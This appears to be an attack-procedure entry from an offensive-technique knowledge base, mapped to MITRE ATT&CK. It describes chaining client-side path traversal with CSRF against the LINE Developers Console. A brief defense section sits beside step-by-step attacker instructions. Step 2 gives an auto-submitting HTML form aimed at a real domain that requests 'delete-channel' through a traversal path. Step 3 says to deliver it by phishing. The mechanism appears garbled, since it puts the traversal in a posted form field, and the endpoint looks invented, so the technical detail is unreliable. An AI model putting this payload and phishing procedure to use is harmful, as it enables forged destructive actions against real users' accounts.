---
id: proc-uuid-002
tags:
  - csrf
  - path-traversal
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:26.844Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[Exploit Public-Facing Application]]'
---
---

# Execute-CSRF-via-CSPT

## Summary

This procedure demonstrates how to chain client-side path traversal with CSRF to enforce unauthorized operations on a web application, compromising availability without proper token validation, as exploited in the LINE Developers Console.

## Description

By exploiting path traversal to manipulate client-side request paths, attackers can bypass CSRF protections that rely on path-specific tokens or validations. In the LINE case, the CSPT allowed forging requests to unprotected endpoints, enabling actions like enforcing channel operations or config changes. This requires victim interaction (e.g., visiting a malicious page) while authenticated. Outcomes include successful unauthorized state changes, leading to medium-impact disruptions.

## Requirements

1. Victim authenticated session on the target site
2. Control over a malicious webpage or email to deliver the CSRF payload
3. Understanding of the application's action endpoints

## Defense

Defensive measures and detection strategies:

- Enforce CSRF tokens on all state-changing endpoints with server-side validation
- Sanitize and normalize paths server-side to prevent traversal chaining
- Log and alert on cross-origin requests or anomalous path patterns

## Objectives

1. Forge requests to bypass CSRF via traversed paths
2. Execute limited operations impacting availability
3. Demonstrate escalation from traversal to action enforcement

## Instructions

### Step 1: Identify Vulnerable Actions

**Context**: Map endpoints affected by path traversal that lack CSRF protection.

Review console network tab for POST actions tied to path inputs.

No command, but note endpoints like /api/enforce?path=...

### Step 2: Craft Malicious CSRF Payload

**Context**: Build an auto-submitting form exploiting the traversal.

Create HTML with hidden fields using traversal in path parameters:

```html
<!DOCTYPE html>
<html><body>
<form action="https://developers.line.biz/api/enforce" method="POST">
  <input type="hidden" name="path" value="../../../bypass/action">
  <input type="hidden" name="operation" value="delete-channel">
</form>
<script>document.forms[0].submit();</script>
</body></html>
```

> Host this on an attacker-controlled domain and lure the victim.

### Step 3: Trigger and Verify

**Context**: Induce victim visit and confirm execution.

Send link via phishing; monitor for success via application feedback or logs.

**Expected Output**: Unauthorized operation completes, e.g., channel enforcement.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Impact]] Impact

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[path-traversal]]
- [[web]]
